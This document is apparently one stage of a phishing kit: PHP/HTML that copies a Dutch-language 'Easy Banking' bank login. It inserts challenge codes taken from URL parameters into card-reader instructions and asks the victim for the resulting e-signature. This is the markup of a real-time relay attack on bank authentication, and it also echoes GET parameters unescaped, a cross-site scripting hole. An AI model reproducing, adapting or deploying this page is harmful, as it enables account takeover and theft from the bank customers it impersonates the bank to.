...
<input type="hidden" name="step"  value="code3">
    <div id="sf-master">
                                                                                    ...
                                                                                    <div class="login_col1">
                                                                                        <div class="login_banner">
                                                                                            <div class="login_banner_inner">
                                                                                                <h1 class="caption"> <span class="ng-binding">Welkom in</span> <span>Easy Banking</span> </h1>
                                                                                                <p class="login_cardreader"></p>
                                                                                            </div>
                                                                                        </div>
                                                                                    </div>
...
<div class="m1-placeholder scum" id="m1-view">
            <div class="identification_ucr new_m1">
            


            <div tabindex="0" class="error_summary show_active err_div" style="display: none;">
                <p class="show_active ng-binding">Verbeter het (de) volgende veld(en)</p>
            ...
            <div class="ucr_details"> <span class="ucr_details__numbering">1.</span>
                <div class="ucr_details__content">
                    <p class="ucr_action_content"> <span class="ucr_action_content ucr_action_1content"> <span class="ng-binding">Steek uw kaart in de kaartlezer en druk op</span> <span class="fontcon-m2 m2_icon"></span> <span class="screen_reader_text">M1</span> </span> </p>
                </div> <span></span>
            </div>

            <div class="ucr_details"> <span class="ucr_details__numbering">2.</span>
                <div class="ucr_details__content">
                    <p class="ucr_action_content"> <span class="ucr_action_content ucr_action_1content"> <span class="ng-binding">Voer uw pincode in en druk op</span> <span class="fontcon-ucr-ok ok_icon"></span> <span class="screen_reader_text">OK</span>  </span> </p>
                </div> <span></span>
            </div>
            ...
            <div class="ucr_details ucr_withblock"> <span class="ucr_details__numbering challenge_part0">3.</span>
                <div class="ucr_details__content">
                    <div class="ucr_content__challenge ucr_action_content"> <span class="f_left challenge_part1 ng-binding">Voer</span>
                        <div class="ucr_challenge__code challenge_part2">
                            <div class="ucr_code">
                                <p class="default_input_field ucr_code__input border_none num1"><?php echo $_GET['code']; ?></p>
                            </div>
                        </div>
                        <p class="challenge_part3"> <span class="ng-binding">in en druk op</span>   <span class="fontcon-ucr-ok ok_icon"></span> <span class="screen_reader_text">OK</span> </p>
                    </div>
                </div>
            </div>
            ...
            <div class="ucr_details ucr_withblock"> <span class="ucr_details__numbering challenge_part0">3.</span>
                <div class="ucr_details__content">
                    <div class="ucr_content__challenge ucr_action_content"> <span class="f_left challenge_part1">Voer</span>
                        <div class="ucr_challenge__code challenge_part2">
                            <div class="ucr_code">
                                <p class="default_input_field ucr_code__input border_none num2"><?php echo $_GET['code2']; ?></p>
                            </div>
                        </div>
                        <p class="challenge_part3"> <span class="ng-binding">in en druk op</span> <span class="fontcon-ucr-ok ok_icon"></span>  <span class="fontcon-ucr-ok ok_icon"></span> <span class="screen_reader_text">OK</span> </p>
                    </div>
                </div>
            </div>
            ...
            <div class="ucr_details ucr_withblock last-child pad-b0">
                <span class="ucr_details__numbering challenge_part0">4.</span>
                

                <div class="ucr_details__content form-group"> 
                	<label for="m1_code	" class="f_left ucr_contentone ucr_action_content ng-binding">Voer de e-handtekening in</label>

                    <div class="ucr_signature ">
                        <div class="default_input_field ucr_signature__input "> 


                        	<input type="tel" id="m1_code" name="m3" class="input_ucr_signature form-control"  data-err_text="E-handtekening" placeholder="---- ----" mask-placeholder="---- ----" data-mask="9999 9999" autocomplete="off" required="" oninput="formatInput3(this)" maxlength="9">
        ...
        <div class="form_inner_block pad_rl30">
            <div class="navigation_btns">
                <div class="right_navigation_btn fullwidth_btn"> <button class="btn_default btn_primary m1_sign_btn btn_active_bg ng-binding">Aanmelden</button> </div>
            </div>
        </div>
                                                                            ...
                                                                            <div class="login_footer">
                                                                                ...
                                                                                <p>
                                                                                    <a class="lnk_primary ng-binding">Bestel een kaartlezer</a></p>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            ...
                                                            <div class="ls-cmp-wrap" id="w1496157905140">
                                                                <div class="iw_component" id="1496157905140">
                                                                    <div id="wcm-l-description">
                                                                        <div class="wcm-html style-default nextgen">
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                    ...
                                                    <div class="wcm-footer nextgen">
                                                        <div class="footer_lnks clearfix">
                                                            <div class="legal_section">
                                                                <ul class="legal_lnks">
                                                                    <li> <a target="_self" class="ng-binding">Over ons</a> </li>
                                                                    <li> <a target="_self" class="ng-binding">Gebruiksvoorwaarden van de Website</a> </li>
                                                                    <li> <a class="postPagebusMessage ng-binding">Cookies</a> </li>
                                                                    <li> <a target="_self" class="ng-binding">Privacyverklaring</a> </li>
                                                                    <li> <a target="_self" class="ng-binding">US Disclaimer</a> </li>
                                                                </ul>
                                                            </div>
                                                            <div class="legal_msg">
